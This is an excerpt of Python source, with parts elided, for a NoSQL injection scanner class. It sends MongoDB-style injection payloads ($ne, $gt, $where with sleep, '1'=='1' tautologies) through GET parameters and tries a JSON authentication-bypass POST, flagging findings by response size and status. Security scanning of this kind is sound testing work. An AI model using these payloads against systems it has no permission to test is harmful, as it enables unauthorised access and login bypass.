...
class NoSQLInjector:
    ...
    async def scan(self, url, content, headers, response):
        ...
        payloads = [
            {"$gt": ""}, {"$ne": "1"}, {"$where": "sleep(5)"},
            "true, $where: '1 == 1'", "|| 1==1", "' || '1'=='1"
        ]
            ...
            for p in payloads:
                ...
                try:
                    async with self.session.get(test, timeout=aiohttp.ClientTimeout(total=10)) as r:
                        ...
                        if r.status in [200, 201] and len(c) > len(content) + 500: # Simple heuristic
                            findings.append({'type':'NoSQL Injection (GET)','severity':'HIGH','url':url,
                                    'parameter':param,'payload':str(p),'evidence':'Response length significantly increased',
        ...
        if 'application/json' in headers.get('content-type', '').lower():
            try:
                ...
                async with self.session.post(url, json=auth_payload, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status in [200, 201]:
                        findings.append({'type':'NoSQL Auth Bypass (POST)','severity':'CRITICAL','url':url,
                                'payload':json.dumps(auth_payload),'evidence':f'Auth bypassed, status {r.status}',
                                'cwe':'CWE-943','owasp':'A01:2021'})
            except: pass
